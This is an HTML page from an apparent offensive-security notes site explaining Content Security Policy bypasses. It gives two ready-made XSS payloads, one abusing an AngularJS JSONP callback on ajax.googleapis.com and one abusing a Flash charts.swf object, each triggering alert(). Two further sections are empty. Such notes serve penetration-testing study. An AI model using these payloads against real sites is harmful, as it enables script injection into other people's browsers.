<!DOCTYPE html>
<html lang="en-US">
<head>
<link rel="icon" type="image/x-icon" href="/conf/LOGO01.png">
<link rel="stylesheet" type="text/css" href="/conf/machete_style_offensive_sections.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script src="/conf/machete_conf.js"></script>
	
  <title> M A C H E T E </title>
  <!--------------------->
  <!-- b0ydC Founder -->
  <!-- --------------- -->
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="utf-8" />
</head>
<body>
<br>
<a href="/index.html"><img src="/conf/letter_logo.jpg" alt="LOGO" style="width:20%;"></a>
<br>
<center>
<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
    <a href="/offensive.html">OFFENSIVE</a> |
    <a href="/defensive.html">DEFENSIVE</a> |
    <a href="/tools.html">WIKI</a> |
  <!-- <a href="/academy/platform.html">ACADEMY</a> | -->
    <a href="/about.html">ABOUT</a> 
</div> 
<p class="titulos"><mark>[CSP HEADER BYPASS]</mark></p>
<div>
<pre>
<div class="column" style="display: inline-block; text-align: left; background-color:gray;">
<button onclick="document.location='/offensive/web_penetration_testing/client_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
CSP: content security policy | its a way to restrict what is allowed in the application
	
<b>Notes:</b>
	1. 'self' means it allows from same domain.
	2. CSP policy is defined in the response header, this is how browser knows the CSP policy is in place
	3. use the dev tools when testing and inspect using the console tab to see if any 'alert' notification pop-up. 
	
	
<details>
<summary>bypass via ajax.googleapis.com</summary>

<b>sample:</b> 
	content-security-policy: script-src 'self' ajax.googleapis.com

<b>payload:</b>	
<code>
&lt;div ng-app ng-csp id=p ng-click=$event.view.alert("XSS")&gt;&lt;script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.6/angular.min.js"&gt;&lt;/script&gt;
&lt;script async src=//ajax.googleapis.com/jsapi?callback=p.click&gt;&lt;/script&gt;
</code>

<b>ng-app:</b> enables angular js usage
<b>ng-csp:</b> enables angular js CSP mode
<b>ng-click:</b> enables angular js click method 

<b>explanation:</b> basically the div is enabling some features (ng-app / ng-csp / ng-click) so it can be used by angular js as 'ajax.googleapis.com' 
is allowed. as the div is calling angular it is needed to import the library to use the functions to call more actions. async ;source is 
allowing the automatic interaction needed to pop-up the click event.  
	
</details>	
<details>
<summary>bypass via flash file</summary>

<b>sample:</b> 
	content-security-policy: script-src 'self'

<b>payload:</b>	
<code>
&lt;object type='application/x-shockwave-flash' data='https://ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowed
Domain=\%22})))}catch(e) {alert(/XSS/)}//'&gt;&lt;param name='AllowScriptAccess' value='always'>&lt;/object&gt;
</code>

<b>Notes:</b>	

	1. this content security policy only allows scripts from the same domain itself.
	2. it is only restricting scripts, but how about flash files ? ajax.googleapis.com is not explicitely allowed, however, via flash files
	it can be call it.
	3. each time you want to try flash csp by pass you need to use the HTML tag 'object'
	4. 'charts.swf' is a vulnerable flash file to XSS, if not working, you can set your own or find other to trigger XSS.
	
</details>	
<details>
<summary>bypass via polyglot file</summary>
	
</details>
<details>
<summary>bypass via angularJS</summary>
	
</details>		
</div>
</pre>
<button onclick="document.location='/offensive/web_penetration_testing/client_side_attacks.html'">GO BACK</button>
</div>
<p class="titulos">©® - 2023/2024.</p>
</center>
</body>
</html>
